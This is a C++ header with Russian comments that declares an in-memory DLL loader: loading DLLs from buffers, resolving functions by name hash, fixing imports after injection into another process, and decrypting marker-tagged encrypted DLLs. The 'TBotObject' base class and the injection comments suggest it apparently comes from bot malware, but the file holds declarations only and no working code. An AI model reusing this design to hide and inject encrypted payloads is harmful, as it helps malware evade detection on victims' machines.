
//****************************************************************************
//  Модуль работы с библиотеками загруженными в память
//
//  Версия: 1.0.1
//  Модифицирован: Август 2012
//****************************************************************************


#ifndef DllLoaderH
#define DllLoaderH
//----------------------------------------------------------------------------

#include <windows.h>
#include "GetApi.h"
#include "Strings.h"

typedef void *HMEMORYMODULE;

//-------------------------------------------------------
//  MemoryLoadLibrary - Функция загружает в память из
//                      переданного буфера памяти
//-------------------------------------------------------
HMEMORYMODULE MemoryLoadLibrary( const void*, bool CallEntryPoint = true, void* param = 0 );


//-------------------------------------------------------
//  MemoryGetProcAddress - Функция возвращает адрес
//                     функции зугруженной в память DLL
//-------------------------------------------------------
FARPROC MemoryGetProcAddress(HMEMORYMODULE Dll, const char* Name);
FARPROC MemoryGetProcAddress(HMEMORYMODULE Dll, DWORD NameHash);

//-------------------------------------------------------
//  MemoryFreeLibrary - Функция освобождает ресурсы
//                      выдеоенные для DLL в памяти
//-------------------------------------------------------
void MemoryFreeLibrary(HMEMORYMODULE);



//-------------------------------------------------------
// Функция обрабатывает таблиуц релоков
//-------------------------------------------------------
void ProcessRelocation(unsigned char *CodeBase, PIMAGE_NT_HEADERS Headers, DWORD Delta);


void CopySections(LPBYTE data, LPBYTE codeBase, PIMAGE_NT_HEADERS old_headers, PIMAGE_NT_HEADERS new_headers);




//-------------------------------------------------------
//  BuildImport - Функция правит таблицу импорта dll.
//                В случае инжекта в другой процесс
//                возможно не совпадение таблицы импорта.
//                Функция необходима для случаем когда
//                рабочий процесс заинжекчен в целевой
//                процесс.
//-------------------------------------------------------
bool BuildImport(PVOID ImageBase);





//*******************************************************
//  Данные для работы с шифрованными DLL
//*******************************************************

//----------------------------------
//  Маркер DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER   "_DLL_DATA_"


//----------------------------------
//  Размер маркера DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER_SIZE 10

//----------------------------------
//  Хэш маркера DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER_HASH 0x8CAC120C /* _DLL_DATA_ */




//-------------------------------------------------
//  Функция возвращает информацию о буфере
//  загифрованной библиотеки. Используется
//  информация заголовков
//
//-------------------------------------------------
bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Password);



//*******************************************************
// TDLL - класс автоматической загрузки, выгрузки
//        библиотек из памяти
//        Класс автоматически расшифровывает шифрованные
//        библиотеки
//
//  Алгоритм шифрования DLL:
//*******************************************************
class TMemoryDLL : public TBotObject
{
private:
	HMEMORYMODULE FHandle;
	bool   FNotFree; //если true, то в деструкторе не уничтожаем длл
public:
	TMemoryDLL(const void* DllBuf);
	~TMemoryDLL();

	bool Load(const void* DllBuf);

	HMEMORYMODULE inline Handle() { return FHandle; }
	bool		  IsTrue()        { return FHandle != NULL; } //true если dll инициализирована

	LPVOID        GetProcAddress(const char*   Name);
	LPVOID inline GetProcAddress(const string& Name) { return GetProcAddress(Name.t_str()); }
	LPVOID        GetProcAddress(DWORD   NameHash);
	bool          GetProcAddress(const char*   Name, LPVOID &Addr);
	bool   inline GetProcAddress(const string& Name, LPVOID &Addr) { return GetProcAddress(Name.t_str(), Addr); }
	bool          GetProcAddress(DWORD NameHash, LPVOID &Addr);

	//---------------------------------------------------------
	//  Функция расшифровывает длл
	//
	//  DllBuf - Указатель на исходный буфер длл
	//
	//  Выходные параметры:
	//
	//  DllSize - размер расшифрованной длл
	//  NewBuf  - Указатель на буфер длл
	//  NewBufAllocated - Установится в истину, если
	//                    для буфера пришлось выделить память
	//---------------------------------------------------------
	bool static DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated);

	void SetNotFree( bool v = true )
	{
		FNotFree = v;
	}
};






//----------------------------------------------------------------------------
#endif